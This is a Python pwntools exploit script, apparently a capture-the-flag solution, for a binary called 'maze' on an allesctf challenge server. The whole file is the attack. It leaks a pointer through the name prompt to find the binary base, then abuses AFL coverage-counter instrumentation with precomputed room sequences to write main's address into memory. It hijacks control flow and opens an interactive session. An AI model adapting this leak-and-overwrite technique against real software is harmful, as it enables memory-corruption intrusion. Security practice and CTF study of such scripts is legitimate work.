#!/usr/bin/env python3
from contextlib import contextmanager
import ssl

from pwn import *


@contextmanager
def mk_tube():
    if args.LOCAL:
        with gdb.debug(['./maze'], gdbscript='''
# b __afl_maybe_log
c
''') as tube:
            yield tube
    else:
        context = ssl.create_default_context()
        host = '7b0000008a5a585e43b11b43.challenges.broker5.allesctf.net'
        port = 1337
        with socket.create_connection((host, port)) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                with remote(host, port, sock=ssock) as tube:
                    yield tube


# generated by build-graph.cpp+generate-seqs.cpp
PTR = 0x117fcc8
POS_SEQS = [
    [1100, 1686, 1063, 1378, 1238, 11025, 2823, 10773, ],  # 117f125, 117fb73, 117ff4e, 117f010, 117fc8b, 117fb5c, 117f00a, 117f04f,
    [3722, 60174, 37757, 35, 1991, 36069, ],  # 117fda6, 117ff34, 117f0aa, 117f7c2, 117f395, 117fe8d,
    [1575, 60174, 37757, 35, 1991, 27943, 30735, 22877, ],  # 117ff2c, 117f67b, 117f0aa, 117f7c2, 117f395, 117fecc, 117f0aa, 117fe69,
    [1991, 27943, 30735, 8496, 40713, 423, ],  # 117fe11, 117fecc, 117f0aa, 117fbbd, 117f0d3, 117f02e,
    [3722, 60174, 37757, 35, 1991, 52834, ],  # 117ffc5, 117ff34, 117f0aa, 117f7c2, 117f395, 117ff9f,
    [1575, 30507, 21061, 5065, 8207, 52361, 2102, 30996, 5065, 8207, 52361, 5997, 30996, 28381, 36314, 29609, 49018, 2710, 46622, ],  # 117fd95, 117fbac, 117f0a0, 117fef1, 117f0bc, 117f07e, 117f03a, 117f0a0, 117f252, 117f0bd, 117f07f, 117f03c, 117f0a0, 117f153, 117f0aa, 117f60f, 117f0a0, 117f89f, 117f56e,
    [5065, 15240, 25790, 23176, 29609, 49018, 2710, 20438, 1578, 10061, 62347, 29511, 35, 36360, 493, ],  # 117f158, 117ffb2, 117f0d5, 117f0aa, 117ffd3, 117f0a1, 117f99f, 117fc32, 117f0a1, 117fca6, 117fdf6, 117f0aa, 117f5b4, 117fd58, 117f062,
]
INC_SEQS = [
    [4491, 60174, 37757, 11025, 2823, 10773, ],  # 117fcc8, 117ff23, 117f0aa, 117ff72, 117f00a, 117f04f,
    [15038, 60174, 37757, 35, 1991, 36069, ],  # 117fcc9, 117f7a9, 117f0aa, 117f7c2, 117f395, 117fe8d,
    [50377, 27943, 30735, 22877, ],  # 117fcca, 117ff51, 117f0aa, 117fe69,
    [41914, 60174, 37757, 35, 1991, 27943, 30735, 8496, 40713, 423, ],  # 117fccb, 117fdb3, 117f0aa, 117f7c2, 117f395, 117fecc, 117f0aa, 117fbbd, 117f0d3, 117f02e,
    [17100, 60174, 37757, 35, 1991, 52834, ],  # 117fccc, 117f7e7, 117f0aa, 117f7c2, 117f395, 117ff9f,
    [54934, 21061, 24438, 20260, 9194, 46622, ],  # 117fccd, 117f0b0, 117f0d7, 117f072, 117f061, 117f06b,
]


def main():
    with mk_tube() as tube:
        # leak base, overwrite __afl_area_ptr
        tube.recvuntil(b'Your name: ')
        name = b'Z' * 32
        tube.send(name)
        tube.recvuntil(b'Welcome to the maze ' + name)
        leak = tube.recvuntil(b'!')[:-1]
        leak += b'\x00' * (8 - len(leak))
        __libc_csu_init, = struct.unpack('<Q', leak)
        print(f'__libc_csu_init = 0x{__libc_csu_init:016x}')
        # print some pointers for convenience
        exe = __libc_csu_init - 0xb01130
        print(f'exe = 0x{exe:016x}')
        assert exe & 0xfff == 0
        rooms_array = exe + 0x10fed60
        print(f'rooms_array = 0x{rooms_array:016x}')
        rw_start = exe + 0x117f000
        rw_end = exe + 0x1180000
        print(f'rw = 0x{rw_start:016x} - 0x{rw_end:016x}')
        main = exe + 0xb00bef
        print(f'main = 0x{main:016x}')
        # write main@
        seq = []
        main_bytes = struct.pack('<Q', main)
        assert main_bytes[6:] == b'\x00\x00'
        for i in range(6):
            seq.extend(POS_SEQS[i])
            seq.extend(INC_SEQS[i] * main_bytes[i])
        seq.extend(POS_SEQS[6])
        seq_str = ' '.join([f'{room:x}' for room in seq])
        tube.sendline(seq_str)
        # jump to main
        main_room = (exe + PTR - rooms_array) // 8
        assert 0x10000 <= main_room < 0x20000, hex(main_room)
        # mess around
        tube.interactive()


if __name__ == '__main__':
    main()
